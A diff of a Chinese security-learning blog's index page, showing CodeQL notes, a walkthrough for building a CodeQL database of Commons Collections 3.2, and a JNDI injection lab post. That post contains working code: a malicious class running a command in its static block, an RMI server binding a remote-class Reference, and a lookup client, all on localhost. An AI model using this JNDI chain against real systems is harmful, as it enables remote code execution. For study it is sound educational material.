+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>使用codeql来分析cc链</p>
+<p>由于codeql无法多个数据库之间查询流,所以只能采用半条链拼接半条链的方式来进行操作</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/283795.html">参考文章</a></p>
+<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">什么是source和sink</span><br><span class="line"></span><br><span class="line">在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</span><br><span class="line"></span><br><span class="line">source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</span><br><span class="line"></span><br><span class="line">sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</span><br><span class="line"></span><br><span class="line">sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</span><br></pre></td></tr></table></figure>
+
+<p>分析cc1进行一次尝试</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/06/codeql%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/06/codeql%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">构建Connons-Colletions3.2_x 的Codeql数据库</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-06 13:41:35" itemprop="dateCreated datePublished" datetime="2022-05-06T13:41:35+08:00">2022-05-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-12 16:21:02" itemprop="dateModified" datetime="2022-05-12T16:21:02+08:00">2022-05-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/codeql/" itemprop="url" rel="index"><span itemprop="name">codeql</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/06/codeql%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/06/codeql%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="构建Connons-Colletions3-2-x-的Codeql数据库"><a href="#构建Connons-Colletions3-2-x-的Codeql数据库" class="headerlink" title="构建Connons-Colletions3.2_x 的Codeql数据库"></a>构建Connons-Colletions3.2_x 的Codeql数据库</h1><p>安装配置好codeql也有一段时间了,期间看了一些简单的语法和例子,最近学校期末了,老师安排的屁事有点多,导致好几天没学习了</p>
+<p>之前就听说codeql分析利用链特别厉害,java中反序列化利用链最出名的就是cc链了吧(个人观点),我学习codeql的目标就是自己能仿照着编写cc链的ql语句</p>
+<p>但是codeql现在的java模块有个问题,就是生成数据库的时候,只能生成一个项目的代码数据库,它的依赖只有在代码中引入并加载的类才会被添加到数据库当中去</p>
+<p>对此,我去github提问了一下(这也是我第一次在github提问…)</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4e3482e87f6c59f7fb66e9d7f4c6645b.png" alt="image-20220512152353868"></p>
+<p>这是维护者大佬做出的回复</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/05cf854bb259eefe20bbb18ed9314c4d.png" alt="image-20220512152328284"></p>
+<p>总而言之,就是想分析哪个依赖,就得单独为它创建数据库,我点了大佬的链接进去,下载下来的数据库是cc4的最新版本的数据库,可能是因为master分支放的是cc4吧…..</p>
+<p>那没办法只能自己建cc3的库了…..</p>
+<p>于是参照这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122330521">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>
+<p>这篇文章中提到两种数据库获取方式,第一种就是去lgtm直接下载,第二种是自己clone一份代码下来,然后上传到github仓库并配置lgtm让lgtm扫描后再去下载数据库,但是转念一想,既然它能生成,那我自己用clone的代码来搞不也一样吗</p>
+<p>于是开始了痛苦之路</p>
+<h2 id="建立CC3数据库"><a href="#建立CC3数据库" class="headerlink" title="建立CC3数据库"></a>建立CC3数据库</h2><p>接下来的东西需要对git的基础命令和原理有一定的了解,可以先去b站看<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1FE411P7B3?spm_id_from=333.337.search-card.all.click">狂神的git视频</a>学习一下</p>
+<p>git clone并切换源码到指定分支</p>
+<p>先打开git bash  然后 clone cc项目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/commons-collections.git</span><br></pre></td></tr></table></figure>
+
+<p>接下来cd进入项目目录,切换分支为cc3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout COLLECTIONS_3_2_X</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>错误方式</p>
+</blockquote>
+<p>一看里面有pom.xml文件,大喜过望,开始mvn clean install生成数据库,然后一个大大的fatal甩在脸上……</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\commons-collection3.2 --language=<span class="string">&quot;java&quot;</span> --<span class="built_in">command</span>=<span class="string">&quot;mvn clean install --file pom.xml&quot;</span> --source-root=D:\TOOLS\codeql\soutce-project\commons-collections --overwrite </span><br></pre></td></tr></table></figure>
+
+<p>之前的文章中说过,生成数据库出错了不能着急,要一步步排查,首先codeql命令行是不会给出具体的错误提示的,只会说是mvn这条命令报错了</p>
+<p>总的来说有两个错误,我们一一来分析解决</p>
+<h4 id="错误一"><a href="#错误一" class="headerlink" title="错误一"></a>错误一</h4><p>然后我们打开idea,在idea命令行中使用mvn clean install –file pom.xml进行编译,出现了这样返回类型不一致的报错,打开报错的类的源码,发现这几个名字牛逼轰轰的Map类中remove方法返回的是Object类型的,这和其间接继承的Map接口中定义的boolean截然不同,怪不得报错</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8d6d61815dec7b21aa543fcb46fa45c0.png" alt="image-20220512153751430"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/bc39db9b1d776707a9b8c386825b546c.png" alt="image-20220512154328441"></p>
+<h6 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h6><p>当我在idea的Project Structure中把jdk版本从平时用的1.8下调到1.7的时候,这个报错就消失了,欧耶!!!</p>
+<h4 id="错误二"><a href="#错误二" class="headerlink" title="错误二"></a>错误二</h4><p>但是与此同时,还有个问题也发生了,使用idea右侧边连的maven 依次 clean和install的时候,报了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误: 不再支持目标选项 1.2。请使用 7 或更高版本。</span><br></pre></td></tr></table></figure>
+
+<p>的错误</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5c58d7e1dc433f315606b54789280a6c.png" alt="image-20220512154036543"></p>
+<p>去百度之后发现大概意思就是说,jdk版本太低了,咋了咋了的</p>
+<p>在cc3的pom.xml最下面发现它自己指定了编译的jdk版本是1.2</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b7c35e183f5f612933fc48656b934440.png" alt="image-20220512154601318"></p>
+<h6 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h6><p>为了一次性到位,首先把pom.xml中的版本改成1.7</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fdf861fb56261b5ff30edf2d38ee09a3.png" alt="image-20220512154736745"></p>
+<p>接着在最下面的plugins中添加这两个</p>
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220512154819016.png" alt="image-20220512154819016" style="zoom:80%;" />
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">testFailureIgnore</span>&gt;</span>true<span class="tag">&lt;/<span class="name">testFailureIgnore</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>并且,打开本地maven的setting.xml文件</p>
+<p>找到对应的位置,就是<code>&lt;profiles&gt;</code>标签下面就行,添加如下语句,指定默认jdk版本</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">profile</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.7<span class="tag">&lt;/<span class="name">id</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">activation</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">activation</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是还是报错了,最后去环境变量里面把JAVA_HOME改成1.7的就行了(到这里终于目标为啥配环境变量的时候非得搞个叫JAVA_HOME的,而不是直接往path里面添加,改起来是真滴快啊)</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3ec4b8d3b4b6e92bacb55f064798a99f.png" alt="image-20220512155048464"></p>
+<h4 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h4><p>最后再次打开命令行输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\commons-collection3.2 --language=<span class="string">&quot;java&quot;</span> --<span class="built_in">command</span>=<span class="string">&quot;mvn clean install --file pom.xml&quot;</span> --source-root=D:\TOOLS\codeql\soutce-project\commons-collections --overwrite </span><br></pre></td></tr></table></figure>
+
+<p>成功构建cc3的数据库</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/25f2a1ac18122cb378b43056fe34a42f.png" alt="image-20220512155241642"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/06/codeql%E5%AE%89%E8%A3%85/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/06/codeql%E5%AE%89%E8%A3%85/" class="post-title-link" itemprop="url">codeql安装</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-06 12:14:36 / 修改时间：13:04:32" itemprop="dateCreated datePublished" datetime="2022-05-06T12:14:36+08:00">2022-05-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/codeql/" itemprop="url" rel="index"><span itemprop="name">codeql</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/06/codeql%E5%AE%89%E8%A3%85/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/06/codeql%E5%AE%89%E8%A3%85/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>本文章为多次尝试之后,自己成功安装并运行成功codeql的记录,没啥技术含量…
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/05/06/codeql%E5%AE%89%E8%A3%85/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">jndi注入学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-04 20:43:07" itemprop="dateCreated datePublished" datetime="2022-05-04T20:43:07+08:00">2022-05-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-05 15:55:11" itemprop="dateModified" datetime="2022-05-05T15:55:11+08:00">2022-05-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="JNDI简介"><a href="#JNDI简介" class="headerlink" title="JNDI简介"></a>JNDI简介</h3><p>JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。</p>
+<p>常见的命名/目录提供者</p>
+<ul>
+<li>RMI</li>
+<li>LDAP</li>
+<li>CORBA</li>
+<li>DNS</li>
+</ul>
+<p>一个简单的例子开始JNDI的学习</p>
+<p>首先编写并编译恶意class文件放到可访问的URL上,接着将其URL注册并绑定给该服务器某端口的RMI服务商</p>
+<blockquote>
+<p>这里有个问题,为什么不直接使用RMI来加载恶意类呢</p>
+</blockquote>
+<p>因为RMI它的特点是调用完结果是由RMI服务器去执行的,执行完的结果以序列化的形式传递给客户端,虽然可能存在反序列化的利用,但是不符合这里想要构造的远程加载恶意class文件并在客户端上面执行的思路</p>
+<p>恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>server.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//第一个参数随便填</span></span><br><span class="line">        Reference reference=<span class="keyword">new</span> Reference(<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:5555/&quot;</span>);</span><br><span class="line">        <span class="comment">//这里末尾要加个/,否则无法读取.....</span></span><br><span class="line">        <span class="comment">//将该reference封装成远程对象</span></span><br><span class="line">        ReferenceWrapper referenceWrapper=<span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;hello&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>client.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url=<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>;</span><br><span class="line">        Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后本质上是通过URLClassLoader去远程加载了恶意类</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-title-link" itemprop="url">javaAgent内存马</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-25 13:29:13" itemprop="dateCreated datePublished" datetime="2022-04-25T13:29:13+08:00">2022-04-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-29 11:08:04" itemprop="dateModified" datetime="2022-04-29T11:08:04+08:00">2022-04-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>记录一下javaAgent的学习</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/23/%E5%86%85%E5%AD%98%E9%A9%AC%E9%98%B2killed/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -219,7 +1319,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-24 11:21:43" itemprop="dateModified" datetime="2022-04-24T11:21:43+08:00">2022-04-24</time>
+                <time title="修改时间：2022-04-25 11:55:13" itemprop="dateModified" datetime="2022-04-25T11:55:13+08:00">2022-04-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -279,826 +1379,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/21/spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/21/spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">spring内存马学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
